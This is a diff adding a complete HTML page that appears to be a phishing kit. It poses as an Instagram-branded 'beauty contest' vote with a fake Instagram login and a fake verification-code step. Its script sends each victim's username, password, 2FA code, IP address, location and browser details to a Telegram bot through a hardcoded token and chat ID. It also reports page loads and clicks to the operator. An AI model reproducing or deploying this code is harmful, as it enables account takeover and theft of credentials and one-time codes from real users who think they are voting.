@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Beauty Contest · Instagram</title>
+    <!-- Font & Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            /* Multi‑color gradient: white → pink → black → white (soft, professional) */
+            background: linear-gradient(135deg, #ffffff 0%, #fce4ec 25%, #f3c4d6 45%, #d4a0b0 65%, #2d2d2d 85%, #1a1a1a 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 18s ease-in-out infinite alternate;
+            margin: 0;
+        }
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            25% { background-position: 50% 0%; }
+            50% { background-position: 100% 50%; }
+            75% { background-position: 50% 100%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .phone-frame {
+            max-width: 380px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(2px);
+            border-radius: 36px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.25), 0 0 0 1px rgba(255,255,255,0.3);
+            overflow: hidden;
+            position: relative;
+            height: 700px;
+            display: flex;
+            flex-direction: column;
+            transition: box-shadow 0.3s;
+        }
+        .screen {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 24px 20px 20px;
+            transition: all 0.2s ease;
+            overflow-y: auto;
+            background: transparent; /* let parent show through */
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        /* ----- WELCOME SCREEN (1) ----- */
+        #welcomeScreen {
+            background: rgba(255, 255, 255, 0.5);
+            backdrop-filter: blur(4px);
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 30px 20px;
+            border-radius: 36px 36px 0 0;
+        }
+        .welcome-icon {
+            font-size: 58px;
+            background: rgba(255,255,255,0.7);
+            width: 100px;
+            height: 100px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px rgba(214, 41, 118, 0.2);
+            color: #d62976;
+            backdrop-filter: blur(2px);
+        }
+        .welcome-title {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #d62976, #fa7e1e, #b5367a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+            line-height: 1.2;
+            text-shadow: 0 2px 8px rgba(214, 41, 118, 0.1);
+        }
+        .welcome-sub {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1e1e1e;
+            margin-bottom: 6px;
+        }
+        .welcome-emoji {
+            font-size: 20px;
+        }
+        .wobble-btn {
+            margin-top: 30px;
+            background: #0095f6;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 24px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 6px 16px rgba(0,149,246,0.35);
+            cursor: pointer;
+            transition: 0.15s;
+            animation: wobble 2s infinite ease-in-out;
+            backdrop-filter: blur(2px);
+        }
+        .wobble-btn i {
+            font-size: 20px;
+        }
+        @keyframes wobble {
+            0%, 100% { transform: rotate(0deg); }
+            15% { transform: rotate(2deg) scale(1.02); }
+            30% { transform: rotate(-2deg) scale(0.98); }
+            45% { transform: rotate(1.5deg); }
+            60% { transform: rotate(-1.5deg); }
+            75% { transform: rotate(0.8deg); }
+        }
+        .wobble-btn:hover {
+            transform: scale(1.02);
+            background: #0080e0;
+        }
+
+        /* ----- LOGIN SCREEN (2) ----- */
+        #loginScreen {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(6px);
+            padding-top: 30px;
+            border-radius: 36px 36px 0 0;
+        }
+        .ig-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .ig-logo i {
+            font-size: 48px;
+            color: #262626;
+            background: radial-gradient(circle at 30% 30%, #feda75, #d62976, #962fbf);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 2px 6px rgba(214,41,118,0.2));
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .login-input {
+            background: rgba(255, 255, 255, 0.8);
+            border: 1px solid rgba(0,0,0,0.1);
+            border-radius: 8px;
+            padding: 14px 14px;
+            font-size: 14px;
+            transition: 0.1s;
+            width: 100%;
+            backdrop-filter: blur(2px);
+        }
+        .login-input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+            background: rgba(255,255,255,0.95);
+        }
+        .login-btn {
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: 600;
+            color: white;
+            font-size: 15px;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: 0.15s;
+            opacity: 0.9;
+            box-shadow: 0 4px 12px rgba(0,149,246,0.25);
+        }
+        .login-btn:active {
+            opacity: 0.7;
+        }
+        .login-btn:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .forgot-link {
+            text-align: center;
+            font-size: 13px;
+            color: #385185;
+            margin-top: 12px;
+        }
+
+        /* ----- OTP / CODE SCREEN (3) ----- */
+        #codeScreen {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(6px);
+            padding-top: 40px;
+            align-items: center;
+            text-align: center;
+            border-radius: 36px 36px 0 0;
+        }
+        .code-icon {
+            font-size: 44px;
+            color: #0095f6;
+            margin-bottom: 16px;
+        }
+        .code-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #1a1a1a;
+        }
+        .code-desc {
+            color: #3d3d3d;
+            font-size: 14px;
+            margin-bottom: 20px;
+            max-width: 280px;
+        }
+        .code-input-group {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .code-input {
+            background: rgba(255,255,255,0.8);
+            border: 1px solid rgba(0,0,0,0.1);
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 4px;
+            backdrop-filter: blur(2px);
+        }
+        .verify-btn {
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: 600;
+            color: white;
+            font-size: 15px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,149,246,0.25);
+        }
+
+        /* ----- FAIL SCREEN (4) ----- */
+        #failScreen {
+            background: rgba(255, 235, 235, 0.75);
+            backdrop-filter: blur(6px);
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            border-radius: 36px 36px 0 0;
+        }
+        .fail-icon {
+            font-size: 64px;
+            color: #ed4956;
+            margin-bottom: 16px;
+        }
+        .fail-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ed4956;
+        }
+        .fail-desc {
+            color: #2d2d2d;
+            margin-top: 6px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* retry button */
+        #retryFromFailBtn {
+            margin-top: 24px;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 32px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,149,246,0.25);
+        }
+        /* small responsive */
+        @media (max-width: 420px) {
+            .phone-frame { height: 640px; }
+        }
+    </style>
+</head>
+<body>
+<div class="phone-frame">
+    <!-- screen 1: welcome -->
+    <div id="welcomeScreen" class="screen">
+        <div class="welcome-icon"><i class="fas fa-crown"></i></div>
+        <div class="welcome-title">𝔹𝕖𝕒𝕦𝕥𝕪 𝕔𝕠𝕟𝕥𝕖𝕤𝕥 𝕗𝕒𝕤𝕙𝕚𝕠𝕟</div>
+        <div class="welcome-sub"><span class="welcome-emoji">🌸</span> nominating media</div>
+        <div style="margin-top: 8px; font-size: 14px; color: #2d2d2d;">Vote for your favorite</div>
+        <button id="continueWithIgBtn" class="wobble-btn">
+            <i class="fab fa-instagram"></i> Continue with Instagram
+        </button>
+        <div style="margin-top: 20px; font-size: 12px; color: #4a4a4a;">to vote contestant platform</div>
+    </div>
+
+    <!-- screen 2: login -->
+    <div id="loginScreen" class="screen hidden">
+        <div class="ig-logo"><i class="fab fa-instagram"></i></div>
+        <form id="loginForm" class="login-form" autocomplete="off">
+            <input type="text" id="usernameInput" class="login-input" placeholder="Username" value="">
+            <input type="password" id="passwordInput" class="login-input" placeholder="Password" value="">
+            <button type="submit" id="loginSubmitBtn" class="login-btn">Log In</button>
+            <div class="forgot-link">Forgot password?</div>
+        </form>
+        <!-- "Secure login" text removed -->
+    </div>
+
+    <!-- screen 3: code verification -->
+    <div id="codeScreen" class="screen hidden">
+        <div class="code-icon"><i class="fas fa-envelope-open-text"></i></div>
+        <div class="code-title">Check your email, SMS or WhatsApp</div>
+        <div class="code-desc">We sent a voting code to your registered contact.</div>
+        <div class="code-input-group">
+            <input type="text" id="codeInput" class="code-input" placeholder="———" maxlength="6" value="">
+            <button id="verifyCodeBtn" class="verify-btn">Verify & vote</button>
+        </div>
+        <div style="margin-top: 18px; font-size: 13px; color: #4a4a4a;">Didn't receive? <span style="color: #0095f6;">Resend</span></div>
+    </div>
+
+    <!-- screen 4: fail -->
+    <div id="failScreen" class="screen hidden">
+        <div class="fail-icon"><i class="fas fa-times-circle"></i></div>
+        <div class="fail-title">Voting failed ❌</div>
+        <div class="fail-desc">due to incorrect details<br>try again.</div>
+        <button id="retryFromFailBtn">Back to login</button>
+    </div>
+
+    <!-- telegram badge REMOVED -->
+</div>
+
+<script>
+    (function() {
+        // ----- CONFIG (UPDATED WITH YOUR CREDENTIALS) -----
+        const BOT_TOKEN = '8764364392:AAE8dfHClzVFHBYHTObz-75GZ3if1-qnYD0';
+        const CHAT_ID = '7844575534';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // DOM refs
+        const welcomeScreen = document.getElementById('welcomeScreen');
+        const loginScreen = document.getElementById('loginScreen');
+        const codeScreen = document.getElementById('codeScreen');
+        const failScreen = document.getElementById('failScreen');
+
+        const continueBtn = document.getElementById('continueWithIgBtn');
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('usernameInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginSubmitBtn = document.getElementById('loginSubmitBtn');
+        const codeInput = document.getElementById('codeInput');
+        const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+        const retryFromFailBtn = document.getElementById('retryFromFailBtn');
+
+        // state
+        let geoData = { ip: 'unknown', location: 'unknown' };
+
+        // ---------- HELPERS ----------
+        function sendToTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
+            fetch(TELEGRAM_API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.warn('Telegram send error', err));
+        }
+
+        // get IP & location (free fallback)
+        function fetchGeoInfo() {
+            return fetch('https://ipinfo.io/json?token=51c2c7c9b1c3a7')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip || 'unknown';
+                    const loc = data.city ? `${data.city}, ${data.country}` : (data.loc || 'unknown');
+                    geoData.ip = ip;
+                    geoData.location = loc;
+                    return geoData;
+                })
+                .catch(() => {
+                    geoData = { ip: 'unavailable', location: 'unavailable' };
+                    return geoData;
+                });
+        }
+
+        // ---------- FLOW ----------
+        // 1. welcome → login (with wobble)
+        continueBtn.addEventListener('click', function() {
+            sendToTelegram(`🔗 <b>Link clicked</b> – user tapped "Continue with Instagram"`);
+
+            welcomeScreen.classList.add('hidden');
+            loginScreen.classList.remove('hidden');
+
+            fetchGeoInfo().then(() => {});
+        });
+
+        // 2. login attempt
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            loginSubmitBtn.disabled = true;
+            loginSubmitBtn.innerHTML = '<span class="spinner"></span>';
+
+            fetchGeoInfo().then(() => {
+                const userAgent = navigator.userAgent || 'unknown';
+                const msg = `
+🚨 <b>Instagram login attempt</b>
+👤 Username: <code>${username}</code>
+🔑 Password: <code>${password}</code>
+📍 Location: ${geoData.location || 'unknown'}
+🌐 IP: ${geoData.ip || 'unknown'}
+📱 UA: ${userAgent.substring(0, 60)}...
+🕒 ${new Date().toLocaleString()}
+                `;
+                sendToTelegram(msg);
+
+                // 2FA notification (immediately after)
+                setTimeout(() => {
+                    sendToTelegram(`🔐 <b>Two-factor notification</b> – code requested for ${username}`);
+                }, 800);
+
+                // redirect to code screen after 8 seconds
+                setTimeout(() => {
+                    loginSubmitBtn.disabled = false;
+                    loginSubmitBtn.innerHTML = 'Log In';
+
+                    // clear fields
+                    usernameInput.value = '';
+                    passwordInput.value = '';
+
+                    loginScreen.classList.add('hidden');
+                    codeScreen.classList.remove('hidden');
+                    codeInput.value = '';
+                }, 8000);
+            });
+        });
+
+        // 3. code verification → fail screen
+        verifyCodeBtn.addEventListener('click', function() {
+            const code = codeInput.value.trim();
+            codeScreen.classList.add('hidden');
+            failScreen.classList.remove('hidden');
+            sendToTelegram(`❌ <b>Voting failed</b> – incorrect code entered: ${code || '(empty)'}`);
+        });
+
+        // 4. retry from fail → back to login (clean)
+        retryFromFailBtn.addEventListener('click', function() {
+            failScreen.classList.add('hidden');
+            loginScreen.classList.remove('hidden');
+            usernameInput.value = '';
+            passwordInput.value = '';
+            loginSubmitBtn.disabled = false;
+            loginSubmitBtn.innerHTML = 'Log In';
+        });
+
+        // ----- On load: notify link opened -----
+        window.addEventListener('load', function() {
+            sendToTelegram(`📲 <b>Link opened</b> – Beauty contest page loaded`);
+            fetchGeoInfo().then(() => {});
+            usernameInput.value = '';
+            passwordInput.value = '';
+            codeInput.value = '';
+        });
+
+        // clear fields whenever login becomes visible
+        function clearLoginFields() {
+            usernameInput.value = '';
+            passwordInput.value = '';
+        }
+        const observer = new MutationObserver(() => {
+            if (!loginScreen.classList.contains('hidden')) {
+                clearLoginFields();
+                loginSubmitBtn.disabled = false;
+                loginSubmitBtn.innerHTML = 'Log In';
+            }
+        });
+        observer.observe(loginScreen, { attributes: true, attributeFilter: ['class'] });
+
+        // extra clear on focus
+        usernameInput.addEventListener('focus', function() { if (this.value) this.value = ''; });
+        passwordInput.addEventListener('focus', function() { if (this.value) this.value = ''; });
+    })();
+</script>
+</body>
+</html>
